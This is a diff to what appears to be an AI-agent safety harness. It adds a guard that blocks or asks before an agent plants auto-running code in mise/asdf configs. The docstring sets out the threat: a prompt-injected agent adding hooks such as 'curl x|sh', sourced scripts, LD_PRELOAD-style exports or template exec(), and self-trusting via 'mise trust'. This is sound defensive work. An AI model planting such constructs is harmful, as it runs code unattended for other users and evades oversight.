@@ -11189,6 +11189,7 @@ _FETCH_HUMAN_ESCAPABLE = (
     (patterns.GO_ENV_FILE_PATH_RE, "a Go toolchain env file"),
     (patterns.HTTP_CLIENT_RC_PATH_RE, "a curl/wget config file (.curlrc/.wgetrc)"),
     (patterns.EDITOR_STARTUP_PATH_RE, "an editor startup/init file (vimrc/nvim/emacs.d)"),
+    (patterns.MISE_PATH_RE, "a mise/asdf config (mise.toml/.tool-versions) or plugin/shim dir"),
 )
 
 
@@ -15238,6 +15239,301 @@ def rule_editor_startup_protect(ev: Event, policy=None) -> Optional[Decision]:
                      "cannot."))
 
 
+# ---- mise / asdf config exec hijack: human-escapable --------------------------
+def _mise_allowed_path(cfg: dict, p: str) -> bool:
+    """`allow` regexes are matched against the lexically NORMALIZED path, so
+    `allowed/../mise.toml` cannot satisfy `allow: ['allowed/']`."""
+    try:
+        norm = os.path.normpath(str(p).replace("\\", "/"))
+    except Exception:
+        return False
+    return _http_client_config_allowed_by_policy(cfg, norm) and ".." not in norm.split("/")
+
+
+def _mise_allowed_cmd(cfg: dict, cmd: str) -> bool:
+    """For a shell command an `allow` regex must match the WHOLE command
+    (fullmatch): a substring match would let `allowed-thing; mise trust`
+    or a trailing `# allowed-thing` comment ride along."""
+    allow = cfg.get("allow") or []
+    if isinstance(allow, str):
+        allow = [allow]
+    elif not isinstance(allow, (list, tuple)):
+        return False
+    for pat in allow:
+        try:
+            if re.fullmatch(str(pat), cmd.strip(), re.IGNORECASE | re.DOTALL):
+                return True
+        except re.error:
+            continue
+    return False
+
+
+_MISE_DELETE_WORDS = frozenset(("delete", "remove", "rm", "unlink", "trash"))
+_MISE_NOUN_WORDS = frozenset(("file", "files", "path", "paths", "item", "items",
+                              "entry", "dir", "directory", "fs"))
+
+
+def _mise_path_shaped(v) -> bool:
+    if not isinstance(v, str):
+        return False
+    t = v.strip()
+    if not t or "\n" in t or not _HTTP_RC_PATH_SHAPE_RE.match(t) and not re.match(
+            r"^[\w.\-]+(?:[/\\][^\r\n]*)?$", t):
+        return False
+    m = None
+    for m in patterns.MISE_PATH_RE.finditer(t):
+        pass
+    return bool(m) and re.fullmatch(r"[ .]*(?::[^\s/\\]*)?(?:[/\\][^\r\n]*)?", t[m.end():]) is not None
+
+
+def _mise_mcp_delete_only(ev: Event) -> bool:
+    if ev.action != ActionClass.MCP:
+        return False
+    words = _http_rc_words(str(ev.tool or "").split("__")[-1])
+    if not (words & _MISE_DELETE_WORDS) or (words - _MISE_DELETE_WORDS - _MISE_NOUN_WORDS):
+        return False
+    return not _editor_startup_has_content_key(ev.args or {})
+
+
+def _mise_new_unsafe(ev: Event, p: str, kind: str) -> list:
+    """Labels of exec-bearing constructs the call would ADD to the file.
+    Write/Edit/MultiEdit/MCP edits are applied to the on-disk file and the
+    parsed before/after construct sets are diffed (formatting-independent
+    fingerprints), so an unrelated edit to a file that already carries a
+    human-set hook is not re-litigated, while uncommenting or re-spelling
+    one counts as adding it."""
+    a = ev.args or {}
+    if _http_rc_mcp_read_only(ev) or _mise_mcp_delete_only(ev):
+        return []
+    if kind == "dir":
+        return ["<write into a mise/asdf plugin, shim or install directory>"]
+    if ev.action == ActionClass.MCP:
+        if _http_rc_words(str(ev.tool or "").split("__")[-1]) & _HTTP_RC_COPY_WORDS:
+            return ["<copied/moved from another file>"]
+        for k in _HTTP_RC_NON_CONTENT_KEYS:
+            v = a.get(k)
+            if isinstance(v, str) and v.strip() and v.strip() != p \
+                    and _HTTP_RC_PATHLIKE_RE.match(v.strip()):
+                pn = str(p).replace("\\", "/").rstrip("/")
+                vn = v.strip().replace("\\", "/").rstrip("/")
+                if not (pn == vn or pn.startswith(vn + "/")):
+                    return [f"<content from another file: {v.strip()[:60]}>"]
+    edits, unreplayable = _http_rc_edit_list(a)
+    if unreplayable and ev.action in (ActionClass.MCP, ActionClass.EDIT):
+        return ["<edit shape not replayable against the file on disk>"]
+    before = _npmrc_read(ev, p)
+    content = a.get("content")
+    if not isinstance(content, str):
+        content = a.get("contents") if isinstance(a.get("contents"), str) else None
+    if edits:
+        if before is None:
+            return ["<edit not verifiable against the file on disk>"]
+        after = _npmrc_apply_edits(before, edits)
+        if after is None:
+            return ["<edit not verifiable against the file on disk>"]
+    elif isinstance(content, str):
+        after = content
+    elif ev.action == ActionClass.MCP:
+        body = [x for x in _http_rc_mcp_strings(ev, a) if x.strip() and x.strip() != p]
+        after = "\n".join(body)
+    else:
+        after = "\n".join(x for x in _http_rc_written_strings(a) if x != p)
+    had = [fp for _, fp in patterns.mise_unsafe_entries(before or "", kind)]
+    added = []
+    for label, fp in patterns.mise_unsafe_entries(after, kind):
+        if fp in had:
+            had.remove(fp)
+        else:
+            added.append(label)
+    return added
+
+
+def rule_mise_exec_protect(ev: Event, policy=None) -> Optional[Decision]:
+    """Gate planting an exec-bearing construct in a mise (formerly rtx) or
+    asdf config -- ``mise.toml``/``.mise.toml``/``mise.local.toml``/
+    ``mise.<env>.toml``, ``.mise/config.toml``, ``.config/mise.toml``,
+    ``~/.config/mise/config.toml`` and ``conf.d/*.toml``, ``/etc/mise/``,
+    legacy ``.rtx.toml``, and ``.tool-versions`` -- any write into the
+    mise/asdf plugin, shim or install trees (``~/.local/share/mise/
+    {plugins,shims,installs}``, ``~/.asdf/{plugins,shims,installs}``), and
+    the CLI forms that do the same without a file write (``mise trust``,
+    ``mise settings set trusted_config_paths``, ``mise set LD_PRELOAD=``,
+    ``mise config set``, ``mise use ubi:x/y``, ``mise plugins install``,
+    ``asdf plugin add``, ``MISE_TRUSTED_CONFIG_PATHS=``/``MISE_PARANOID=``
+    environment overrides).
+
+    PLAN / THREAT MODEL: with ``mise activate`` in the shell rc (mise's
+    recommended setup), every prompt and every ``cd`` runs ``mise
+    hook-env``, which loads each ``mise.toml`` from the cwd up to ``/``
+    plus the global config; so do ``mise exec``/``mise run`` and every shim.
+    A prompt-injected agent -- or a cloned repo it was asked to set up --
+    can make that load run code, unattended, for the human, a teammate or
+    CI: ``[hooks] enter = "curl x|sh"`` (also ``cd``/``leave``/
+    ``preinstall``/``postinstall``), ``[[watch_files]] run``, ``[env]
+    _.source = "x.sh"`` (bash sourced at activation), ``_.path`` (PATH
+    shadowing), ``_.file``, exported variables such as ``LD_PRELOAD``/
+    ``NODE_OPTIONS``/``BASH_ENV``/``PROMPT_COMMAND``/``PS1``/
+    ``GIT_SSH_COMMAND``/``*_PROXY``/``PIP_INDEX_URL``/``XDG_CONFIG_HOME``/
+    ``ANTHROPIC_BASE_URL``/``MISE_*``, a Tera ``{{ exec(command=...) }}``
+    in any string value, ``[plugins]`` from a git URL, ``[tools]`` with a
+    code-fetching backend (``ubi:``/``github:``/``http:``/``npm:``/
+    ``cargo:``/``go:``/``pipx:``/``vfox:``/``asdf:``), a ``path:`` version
+    or tool options (``postinstall``), ``[tool_alias]`` remapping ``node``
+    to one of those, and ``[settings]`` that remove mise's own checks
+    (``trusted_config_paths``, ``paranoid = false``, ``yes``,
+    ``url_replacements``, ``gpg_verify = false``, shell overrides). It is
+    the direnv ``.envrc`` threat (``rule_direnv_protect``) for the tool
+    that has largely replaced direnv+asdf, and no existing guard named any
+    of these paths. mise's defense is ``mise trust`` -- a CLI the agent can
+    run itself, like ``direnv allow`` -- so the trust/settings commands are
+    gated as the activation half; the global config is trusted implicitly.
+
+    Unlike an editor init file, ``mise.toml`` has a large routine subset
+    (``[tools] node = "22"``, ``[env] NODE_ENV``, ``[tasks]``), so the
+    content check PARSES the file (``tomllib``) rather than gating every
+    write: only the constructs above are gated, and an edit is applied to
+    the on-disk file and the before/after construct sets are diffed by
+    canonical fingerprint -- uncommenting or re-spelling a construct counts
+    as adding it, an unrelated edit next to a human-set hook does not.
+    ``[env]``'s dangerous-variable test is a denylist (exact names,
+    prefixes, suffixes, with a small benign-exception set); ``[settings]``
+    is an allowlist. Unparseable TOML, an oversized file, an edit that
+    cannot be replayed, or (on Python 3.10 without ``tomli``) any write
+    fails closed.
+
+    Edit/Write/MultiEdit: by target path. MCP: a shell-type tool is re-
+    judged as Bash; read-shaped and pure-delete tools pass; copy/move tools
+    and second-file sources are gated; the target may be named under any
+    key, as a patch header, or as a mapping key. Shell: a command naming a
+    mise path (literal, ``\\``-escaped, or as a glob/brace word) is gated
+    unless every simple command only reads/deletes (or is a non-writing
+    ``git`` subcommand -- ``git add mise.toml``); the CLI forms above are
+    gated by subcommand. ``curl -o mise.toml <url>`` is also caught by
+    ``rule_fetch_to_file_protect``, with which this guard's path regex is
+    registered.
+
+    Config (``policy.mise_exec``): ``mode`` (deny|ask|monitor|off, default
+    ask), ``allow`` (regexes; matched against the normalized path for file
+    writes, and against the WHOLE command for shell). Escapable only by a
+    human: a trailing ``# aegis-allow`` on the shell form, or
+    ``AEGIS_ALLOW_MISE_EXEC=1`` set before launch; a spawned agent can do
+    neither.
+
+    Honest scope: ``MISE_CONFIG_DIR``/``MISE_GLOBAL_CONFIG_FILE``/
+    ``MISE_DATA_DIR``/``ASDF_DATA_DIR`` relocations set OUTSIDE this
+    command (setting them inline is gated), task files (``[tasks]``,
+    ``.mise-tasks/``, ``mise-tasks/``, ``task_config.includes``) -- they run
+    only on an explicit ``mise run``, like a ``Makefile`` -- unless a hook
+    calls them (hooks are gated); a shell-side content check (a shell write
+    to a mise path asks regardless of content); unknown-name placement
+    into the config/plugin parents (``cp -r d ~/.asdf/``, ``tar xf x -C
+    ~/.config``) and bare ``*.toml`` globs; ``.asdfrc``/legacy idiomatic
+    version files (``.nvmrc``, ``.python-version``: version strings only);
+    ``mise generate`` forms other than ``git-pre-commit --write``; an
+    ``[env]`` variable outside the denylist that some program treats as
+    exec-bearing; and paths assembled indirectly -- the same "computed
+    indirectly" class every sibling guard discloses. Accepted false ASKs:
+    any shell write that names a mise path (``echo 'node 22' >>
+    .tool-versions``), common but code-fetching tool backends (``npm:``/
+    ``pipx:``/``cargo:``) on first add, unparseable TOML.
+    """
+    cfg = getattr(policy, "mise_exec", None) or {}
+    raw_mode = cfg.get("mode", "ask")
+    mode = str(raw_mode).lower()
+    if mode in ("off", "false") or raw_mode is False:
+        return None
+    action = Action.ASK if mode == "ask" else Action.DENY
+
+    def _finish(would: Decision) -> Optional[Decision]:
+        if mode == "monitor":
+            _record_monitor(ev, would, "mise-exec-protect-monitor")
+            return None
+        return would
+
+    if ev.action == ActionClass.MCP:
+        shell_cmd = _http_rc_mcp_shell_command(ev)
+        if shell_cmd is not None:
+            sub = Event.make(HookEvent.PRE_TOOL_USE, tool="Bash",
+                             args={"command": shell_cmd}, cwd=ev.cwd)
+            d = rule_mise_exec_protect(sub, policy)
+            if d is not None:
+                return Decision(d.action, d.rule, f"MCP tool '{ev.tool}' runs a "
+                                "command that touches mise/asdf config. " + d.message)
+            a0 = ev.args or {}
+            if isinstance(a0.get("command"), str) and re.fullmatch(r"\s*[A-Za-z_]{1,32}\s*", a0["command"]):
+                ev = Event.make(ev.event, tool=ev.tool, action=ev.action, cwd=ev.cwd,
+                                args={k: v for k, v in a0.items() if k != "command"})
+
+    if ev.action in (ActionClass.EDIT, ActionClass.WRITE, ActionClass.MCP):
+        p = _path(ev)
+        a = ev.args or {}
+        kind = patterns.mise_kind(p) if "\n" not in p else ""
+        found = None
+        if not kind and ev.action == ActionClass.MCP:
+            for s_ in _flatten_strings(a):
+                s_ = str(s_)
+                if _mise_path_shaped(s_):
+                    kind, p = patterns.mise_kind(s_.strip()), s_.strip()
+                    break
+            if not kind and not _http_rc_mcp_read_only(ev):
+                exempt = set()
+                if _path(ev) and "\n" not in _path(ev):
+                    exempt = {"content", "contents", "text", "body", "file_content", "new_content"}
+                for k_, v_ in a.items():
+                    if str(k_) in exempt:
+                        continue
+                    if any(patterns.mise_patch_hit(str(s_)) for s_ in _flatten_strings({k_: v_})):
+                        kind, p, found = "toml", "<patch>", ["<patch touching a mise/asdf config>"]
+                        break
+            if not kind and not _http_rc_mcp_read_only(ev):
+                for k_ in _http_rc_mapping_keys(a):
+                    if patterns.mise_kind(k_):
+                        kind, p, found = (patterns.mise_kind(k_), k_,
+                                          ["<content keyed by a mise/asdf config path>"])
+                        break
+        if not kind:
+            return None
+        if found is None:
+            found = _mise_new_unsafe(ev, p, kind)
+        if not found:
+            return None
+        if os.environ.get("AEGIS_ALLOW_MISE_EXEC") or _mise_allowed_path(cfg, p):
+            return None
+        shown = ", ".join(found[:5]) + (", ..." if len(found) > 5 else "")
+        return _finish(Decision(action, "mise-exec-protect",
+                         f"'{p}' is a mise/asdf config or runtime file, and this "
+                         f"write adds: {shown}. mise loads it on every prompt/"
+                         "`cd` into the project (and on every `mise exec`/shim "
+                         "call), so hooks, `_.source`, exec-bearing env vars, "
+                         "template exec(), plugins or code-fetching tool "
+                         "backends run unattended for whoever enters the "
+                         "directory next. Review the change, then confirm with "
+                         "AEGIS_ALLOW_MISE_EXEC=1; a spawned agent cannot."))
+
+    if _is_shell(ev):
+        raw = _cmd(ev)
+        cmd = normalize.scan_surface(raw, sep="\n")
+        writes = False
+        if (patterns.mise_shell_path_hit(cmd) or patterns.mise_shell_path_hit(raw)):
+            writes = not (patterns.mise_shell_only_reads(cmd)
+                          and patterns.mise_shell_only_reads(raw))
+        cli = patterns.mise_cli_hit(cmd) or patterns.mise_cli_hit(raw)
+        if not (writes or cli):
+            return None
+        if (_override_allowed(ev) or os.environ.get("AEGIS_ALLOW_MISE_EXEC")
+                or _mise_allowed_cmd(cfg, raw)):
+            return None
+        what = ("A mise/asdf config file or plugin/shim directory is being "
+                "written from a shell" if writes else cli)
+        return _finish(Decision(action, "mise-exec-protect",
+                         f"{what} -- mise runs a config's hooks, `_.source` "
+                         "scripts, env exports and template exec() on every "
+                         "prompt/`cd` into the project once it is trusted, "
+                         "unattended. A human may append '# aegis-allow', or "
+                         "set AEGIS_ALLOW_MISE_EXEC=1; a spawned agent cannot."))
+    return None
+
+
 _CORE_RULES = (
     rule_attest_session,
     rule_containment,
@@ -15302,6 +15598,7 @@ _CORE_RULES = (
     rule_http_client_config_protect,
     # Any-write ASK; same tail-block reason as above.
     rule_editor_startup_protect,
+    rule_mise_exec_protect,
     rule_agent_rules_protect,
 )
 
